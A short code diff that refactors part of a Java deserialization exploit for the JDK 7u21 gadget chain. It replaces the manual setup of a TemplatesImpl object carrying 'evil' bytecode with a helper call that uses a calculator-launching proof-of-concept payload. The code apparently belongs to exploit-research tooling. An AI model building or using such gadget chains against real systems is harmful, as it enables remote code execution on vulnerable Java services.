@@ -15,12 +15,7 @@ import java.util.Map;
 
 public class Jdk7u21 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = Utils.getEvilPayload("calc");
-        TemplatesImpl templates = new TemplatesImpl();
-        Utils.setValue(templates ,"_name" ,"xxx");
-        Utils.setValue(templates ,"_class" ,null);
-        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
-        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         String zeroHashCodeStr = "f5a5a608";
 
